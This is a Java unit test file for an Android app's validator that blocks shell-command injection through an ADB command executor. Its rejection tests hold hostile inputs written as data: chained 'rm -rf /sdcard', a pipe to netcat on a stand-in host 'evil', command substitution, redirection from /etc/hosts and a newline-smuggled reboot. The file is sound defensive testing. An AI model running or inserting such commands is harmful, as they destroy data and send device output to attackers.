package org.appdevforall.k2go.adb.domain;

import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertTrue;

import org.junit.Test;

/**
 * Unit tests for {@link AdbShellCommand} — the S4 guard against shell-command
 * injection through {@code IIABAdbManager.executeCommand}.
 */
public class AdbShellCommandTest {

    @Test
    public void acceptsTheLegitimateAppCommands() {
        assertTrue(AdbShellCommand.isSafe(
                "settings put global settings_enable_monitor_phantom_procs 0"));
        assertTrue(AdbShellCommand.isSafe(
                "device_config put activity_manager max_phantom_processes 256"));
    }

    @Test
    public void rejectsCommandChaining() {
        assertFalse(AdbShellCommand.isSafe("settings put global x 0; rm -rf /sdcard"));
        assertFalse(AdbShellCommand.isSafe("settings put global x 0 && reboot"));
        assertFalse(AdbShellCommand.isSafe("settings get global x | nc evil 1234"));
    }

    @Test
    public void rejectsSubstitutionAndRedirection() {
        assertFalse(AdbShellCommand.isSafe("echo $(reboot)"));
        assertFalse(AdbShellCommand.isSafe("echo `id`"));
        assertFalse(AdbShellCommand.isSafe("cat /x > /sdcard/out"));
        assertFalse(AdbShellCommand.isSafe("cmd < /etc/hosts"));
    }

    @Test
    public void rejectsQuotesEscapesAndControlChars() {
        assertFalse(AdbShellCommand.isSafe("settings put global x '0'"));
        assertFalse(AdbShellCommand.isSafe("settings put global x \"0\""));
        assertFalse(AdbShellCommand.isSafe("settings put global x 0\\"));
        assertFalse(AdbShellCommand.isSafe("settings put global x 0\nreboot"));
    }

    @Test
    public void rejectsEmptyOrNull() {
        assertFalse(AdbShellCommand.isSafe(null));
        assertFalse(AdbShellCommand.isSafe(""));
        assertFalse(AdbShellCommand.isSafe("   "));
    }
}
